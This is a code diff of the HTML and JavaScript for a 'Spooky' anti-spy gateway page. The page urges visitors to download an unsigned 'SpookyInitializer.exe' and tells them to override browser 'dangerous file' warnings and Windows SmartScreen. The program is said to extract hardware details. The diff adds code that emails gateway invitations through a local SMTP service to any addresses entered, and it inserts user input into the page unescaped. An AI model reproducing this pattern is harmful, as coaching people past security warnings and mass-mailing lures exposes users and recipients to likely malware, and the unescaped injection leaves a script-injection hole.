@@ -15,12 +15,10 @@
 
         .container { max-width: 840px; margin: 40px auto; padding: 40px; background: #12141c; border-radius: 14px; border: 1px solid #3b4252; box-shadow: 0 15px 40px rgba(0,0,0,0.9); box-sizing: border-box; text-align: center; }
         
-        /* Edge-to-edge scaled heading rule */
         h1 { color: #e0aaff; font-size: clamp(32px, 4.5vw, 48px); margin-top: 0; letter-spacing: 1px; text-shadow: 0 2px 12px rgba(157, 78, 221, 0.5); width: 100%; text-align: center; line-height: 1.2; box-sizing: border-box; padding: 0 1rem; word-break: keep-all; white-space: nowrap; }
         h3 { color: #e0aaff; border-bottom: 1px solid #3b4252; padding-bottom: 12px; margin-top: 30px; font-size: 24px; width: 100%; text-align: center; letter-spacing: 0.5px; }
         p { color: #94a3b8; line-height: 1.6; font-size: 18px; }
 
-        /* Glowing Dark Button Styling */
         .btn { display: inline-block; width: auto; min-width: 310px; max-width: 100%; background: #1a1e29; color: #e0aaff; padding: 16px 30px; margin: 12px auto; text-decoration: none; font-weight: 700; border-radius: 8px; text-align: center; transition: all 0.25s ease; cursor: pointer; border: 1px solid #7b2cbf; box-sizing: border-box; font-size: 18px; box-shadow: 0 4px 15px rgba(123, 44, 191, 0.25); }
         .btn:hover { background: #252b3b; color: #ffffff; border-color: #9d4edd; transform: translateY(-2px); box-shadow: 0 0 25px rgba(157, 78, 221, 0.8), inset 0 0 10px rgba(157, 78, 221, 0.4); }
         
@@ -42,7 +40,6 @@
         .intro-card li { margin-bottom: 14px; color: #e2e8f0; font-size: 17px; }
         .intro-card strong { color: #ffb703; }
 
-        /* Boosted Telemetry Box Container */
         .telemetry-box { background: #1a1e29; border: 1px solid #4a5568; padding: 24px 28px; border-radius: 10px; margin: 25px auto; font-family: monospace; font-size: 20px; color: #e0aaff; text-align: left; max-width: 650px; box-shadow: inset 0 2px 8px rgba(0,0,0,0.6); }
         .telemetry-box div { margin: 10px 0; }
         
@@ -74,24 +71,20 @@
 </head>
 <body>
 
-    <!-- Dynamic Landing Header (Switches logo based on key state) -->
     <div id="landing-header" class="header-banner">
         <img id="landing-logo-img" src="SPOOKY_Logo_new_user.png" alt="Spooky Service Logo">
     </div>
 
-    <!-- Interior Module Banner (Switches based on authentication state) -->
     <div id="module-banner" class="module-banner" style="display:none;">
         <img id="module-banner-img" src="spooky_banner.png" alt="Spooky Operations Banner">
     </div>
 
     <div class="container">
 
-        <!-- VIEW 1: ONE-BUTTON STEP-BY-STEP DYNAMIC ONBOARDING -->
         <div id="view-onboarding" class="portal-view">
             <h1>Spooky Node Provisioning</h1>
             <p style="text-align: center;">Secure Anti-Spy tunneling requires a verified local hardware anchor before access to peer networks.</p>
             
-            <!-- How Spooky Works Button -->
             <div>
                 <button onclick="switchModule('how-it-works')" class="btn btn-small-link">How Spooky Anti-Spy Tunneling Works</button>
             </div>
@@ -101,12 +94,10 @@
                 <div>Anchor Status: <span id="anchor-status-display" style="color: #ff6b6b;">No Active Key Bound in Session</span></div>
             </div>
 
-            <!-- Step 1: Initial Download Action Button -->
             <div id="single-action-container">
                 <button id="primary-action-btn" class="btn" onclick="handleClientDownload();">Download Windows Client</button>
             </div>
 
-            <!-- Prominent Setup & Security Notice -->
             <div id="desktop-instructions" class="instruction-box">
                 <strong style="color: #ffb703; font-size: 19px; display: block; margin-bottom: 10px;">IMPORTANT SETUP & SECURITY NOTICE:</strong>
                 <ol id="instruction-steps"></ol>
@@ -114,12 +105,10 @@
                 <button onclick="resetDownloadFlow();" class="btn btn-secondary" style="margin-top: 12px;">Return to Main Gateway</button>
             </div>
 
-            <!-- Step 2: Activation Button -->
             <div id="activation-btn-container" style="display:none; margin-top: 25px;">
                 <button onclick="verifyLocalNode()" class="btn btn-activate">Activate Node & Enter Spooky Gateway</button>
             </div>
 
-            <!-- Always-available fallback -->
             <div id="restore-session-container">
                 <button onclick="verifyLocalNode()" class="btn" style="margin-top: 25px;">Already Have a Node Key Installed? Click Here to Restore Session</button>
             </div>
@@ -127,13 +116,11 @@
             <div id="onboarding-feedback" class="feedback-panel"></div>
         </div>
 
-        <!-- VIEW 2: OPERATIONS MENU -->
         <div id="view-menu" class="portal-view">
             <div id="operations-menu-wrapper" class="operations-menu-container">
                 <h1 style="font-size: 38px; letter-spacing: 2px; width: 100%;">Spooky Operations Menu</h1>
                 <p style="text-align: center;">Hardware Anchor Authenticated. Spooky Gateway Active.</p>
                 
-                <!-- How Spooky Works Button placed under title -->
                 <div>
                     <button onclick="switchModule('how-it-works')" class="btn btn-small-link">How Spooky Anti-Spy Tunneling Works</button>
                 </div>
@@ -143,14 +130,12 @@
                     <div>Spooky Key Anchor: <span id="active-key-display" style="color: #ffb703;">Loading...</span></div>
                 </div>
 
-                <!-- Slim Operations Menu Buttons -->
                 <div style="margin-top: 30px; display: flex; flex-direction: column; align-items: center; gap: 6px;">
                     <button onclick="switchModule('file-transfer')" class="btn">Spooky Secure Peer-to-Peer File Transfer</button>
                     <button onclick="switchModule('video-1on1')" class="btn">Spooky One-on-One Peer Video Conference</button>
                     <button onclick="switchModule('video-group')" class="btn">Spooky Multiparty Group Video Conference</button>
                 </div>
 
-                <!-- Spooky Access Tiers & Billing Section -->
                 <div style="background: #07080a; border: 1px solid #ffb703; padding: 25px; border-radius: 10px; margin-top: 35px; text-align: left;">
                     <h3 style="color: #ffb703; margin-top: 0; border-bottom: 1px solid #ffb703; text-align: center; font-size: 26px; letter-spacing: 0.8px; padding-bottom: 15px;">
                         Spooky Access Tiers & Subscriptions
@@ -162,7 +147,6 @@
                     </div>
                 </div>
 
-                <!-- Verified Subscribing Storefronts Directory -->
                 <div class="vendor-list">
                     <strong>Authorized Subscribing Storefront:</strong>
                     <ul>
@@ -172,7 +156,6 @@
             </div>
         </div>
 
-        <!-- MODULE 1: FILE TRANSFER -->
         <div id="mod-file-transfer" class="active-module">
             <h1 style="font-size: 32px; letter-spacing: 1px; width: 100%; text-align: center; line-height: 1.3;">
                 Spooky Secure Peer-to-Peer<br>File Transfer Portal
@@ -191,7 +174,6 @@
             </div>
         </div>
 
-        <!-- MODULE 2: ONE-ON-ONE VIDEO -->
         <div id="mod-video-1on1" class="active-module">
             <h1 style="font-size: 32px; letter-spacing: 1px; width: 100%; text-align: center; line-height: 1.3;">
                 Spooky One-on-One<br>Peer Video Conference
@@ -208,7 +190,6 @@
             </div>
         </div>
 
-        <!-- MODULE 3: GROUP VIDEO -->
         <div id="mod-video-group" class="active-module">
             <h1 style="font-size: 32px; letter-spacing: 1px; width: 100%; text-align: center; line-height: 1.3;">
                 Spooky Multiparty<br>Group Video Conference
@@ -227,7 +208,6 @@
             </div>
         </div>
 
-        <!-- STANDALONE MODULE: HOW SPOOKY WORKS -->
         <div id="mod-how-it-works" class="active-module">
             <div class="intro-card" style="display: block; border: none; padding: 0; background: transparent;">
                 <h1 style="font-size: 32px; letter-spacing: 1px; width: 100%; text-align: center; line-height: 1.3;">
@@ -294,7 +274,7 @@
             continueDownloadBtn.setAttribute("href", "SpookyInitializer.exe");
             continueDownloadBtn.setAttribute("download", "SpookyInitializer.exe");
             instructionSteps.innerHTML = `
-                <li><strong>Browser Warning:</strong> If your browser warns the file is dangerous or suspicious, click the menu/arrow next to the download and select <strong>"Download suspicious file"</strong> or <strong>"Keep anyway"</strong>. (Sovereign skunkworks software does not use commercial publisher tags).</li>
+                <li><strong>Browser Warning:</strong> If your browser warns the file is dangerous or suspicious, click the menu/arrow next to the download and select <strong>"Download suspicious file"</strong> or <strong>"Keep anyway"</strong>.</li>
                 <li><strong>Windows SmartScreen:</strong> When you run the file, Windows will display a blue shield. Click <strong>"More info"</strong>, then click <strong>"Run anyway"</strong>.</li>
                 <li><strong>Node Execution:</strong> The DOS console will extract your hardware components, bind your cryptographic seed to local system cache, and ask you to press Enter for final cleanup.</li>
                 <li><strong>Gateway Activation:</strong> Return here and click the green <strong>"Activate Node & Enter Spooky Gateway"</strong> button.</li>
@@ -474,6 +454,20 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
+        async function sendEngineEmail(recipient, subject, body, feedbackElement) {
+            try {
+                const response = await fetch('http://127.0.0.1:5000/api/send-email', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ recipient, subject, body })
+                });
+                const data = await response.json();
+                return data;
+            } catch (err) {
+                return { success: false, message: "Could not reach local SMTP server on port 5000." };
+            }
+        }
+
         async function executeFileTransfer() {
             const email = document.getElementById('transferEmail').value.trim();
             const fileInput = document.getElementById('transferFile');
@@ -492,19 +486,31 @@
             }
             const fileName = fileInput.files[0].name;
             feedback.className = 'feedback-panel';
-            feedback.innerHTML = "Interrogating local SQLite database via <code>127.0.0.1:5000</code> for [" + email + "]...";
+            feedback.innerHTML = "Interrogating local database & dispatching secure file transmission via SMTP to [" + email + "]...";
 
+            // Interrogate first
             try {
-                const response = await fetch('http://127.0.0.1:5000/api/interrogate', {
+                const intResp = await fetch('http://127.0.0.1:5000/api/interrogate', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ recipient: email })
                 });
-                const data = await response.json();
+                const intData = await intResp.json();
 
-                if (data.node_verified) {
-                    feedback.className = 'feedback-panel feedback-success';
-                    feedback.innerHTML = "<strong>Spooky Interrogation Complete:</strong> Active Spooky Key verified for [" + email + "]. Encrypted tunnel established. File packaged as <strong>'" + fileName + ".spooky'</strong> and transmitted successfully.";
+                if (intData.node_verified) {
+                    // Send actual email notification
+                    const mailSubject = "Spooky Secure File Transfer: " + fileName;
+                    const mailBody = `Hello,\n\nA secure .spooky file transfer container ('${fileName}.spooky') has been routed to your hardware node.\nRecipient Node ID: ${intData.node_id}\n\nPlease open your Spooky Gateway to receive and decrypt the stream.\n\n- Spooky Sovereign Engine`;
+                    
+                    const mailResult = await sendEngineEmail(email, mailSubject, mailBody);
+                    
+                    if (mailResult.success) {
+                        feedback.className = 'feedback-panel feedback-success';
+                        feedback.innerHTML = "<strong>Transmission Complete & Email Sent:</strong> Active Spooky Key verified for [" + email + "]. Real SMTP notice dispatched successfully.";
+                    } else {
+                        feedback.className = 'feedback-panel feedback-warning';
+                        feedback.innerHTML = "<strong>Node Verified, but SMTP Failed:</strong> " + mailResult.message;
+                    }
                 } else {
                     feedback.className = 'feedback-panel feedback-warning';
                     feedback.innerHTML = "<strong>No Active Node Found:</strong> Recipient [" + email + "] has no registered hardware anchor.";
@@ -515,7 +521,7 @@
             }
         }
 
-        function executeCall1on1() {
+        async function executeCall1on1() {
             const email = document.getElementById('callEmail1on1').value.trim();
             const feedback = document.getElementById('call1on1-feedback');
             feedback.style.display = 'block';
@@ -524,20 +530,50 @@
                 feedback.innerHTML = "<strong>Error:</strong> Please enter a valid recipient email address.";
                 return;
             }
-            feedback.className = 'feedback-panel feedback-warning';
-            feedback.innerHTML = "<strong>Spooky Interrogation Complete:</strong> Recipient [" + email + "] verified.<br><strong>Stream Status:</strong> Pending Recipient Acceptance. An instant secure video invitation link has been dispatched to " + email + ".";
+            feedback.className = 'feedback-panel';
+            feedback.innerHTML = "Initiating secure 1-on-1 video link & sending SMTP invitation to " + email + "...";
+
+            const mailSubject = "Spooky Secure 1-on-1 Video Conference Invitation";
+            const mailBody = `Hello,\n\nYou have been invited to establish a zero-retention encrypted 1-on-1 video stream via Spooky Sovereign.\n\nAccess Gateway: https://spookifyed.com\n\n- Spooky Sovereign Engine`;
+            
+            const mailResult = await sendEngineEmail(email, mailSubject, mailBody);
+            if (mailResult.success) {
+                feedback.className = 'feedback-panel feedback-success';
+                feedback.innerHTML = "<strong>Invitation Dispatched:</strong> Secure 1-on-1 video invitation email successfully sent to " + email + ".";
+            } else {
+                feedback.className = 'feedback-panel feedback-warning';
+                feedback.innerHTML = "<strong>SMTP Dispatch Error:</strong> " + mailResult.message;
+            }
         }
 
-        function executeGroupCall() {
+        async function executeGroupCall() {
             const room = document.getElementById('groupRoomName').value.trim() || "Spooky-Conference-Room";
             const emails = document.getElementById('groupEmails').value.trim();
             const feedback = document.getElementById('group-feedback');
-            const inviteUrl = "https://spookifyed.com/?call_invite=" + encodeURIComponent(room);
             feedback.style.display = 'block';
-            feedback.className = 'feedback-panel feedback-success';
-            feedback.innerHTML = "<strong>Multiparty Group Conference Initialized:</strong><br>" +
+
+            const inviteUrl = "https://spookifyed.com/?call_invite=" + encodeURIComponent(room);
+            
+            if (emails) {
+                feedback.className = 'feedback-panel';
+                feedback.innerHTML = "Dispatching group conference invitations via SMTP...";
+
+                const mailSubject = "Spooky Group Conference Room Invite: " + room;
+                const mailBody = `Hello,\n\nYou have been added to a multiparty secure group conference room: ${room}.\n\nDirect Invite Link:\n${inviteUrl}\n\n- Spooky Sovereign Engine`;
+
+                const mailResult = await sendEngineEmail(emails, mailSubject, mailBody);
+                if (mailResult.success) {
+                    feedback.className = 'feedback-panel feedback-success';
+                } else {
+                    feedback.className = 'feedback-panel feedback-warning';
+                }
+            } else {
+                feedback.className = 'feedback-panel feedback-success';
+            }
+
+            feedback.innerHTML += "<strong>Multiparty Group Conference Initialized:</strong><br>" +
                 "Room Tag: <code>" + room + "</code><br>" +
-                (emails ? "Invitations dispatched to: " + emails + "<br>" : "") +
+                (emails ? "Invitations emailed to: " + emails + "<br>" : "") +
                 "<br>Invite Link:<br><input type='text' value='" + inviteUrl + "' readonly style='background:#07080a; color:#e0aaff; border:1px solid #7b2cbf; padding:8px; width:100%; margin-top:8px; font-size:16px;' onclick='this.select()'>";
         }
 
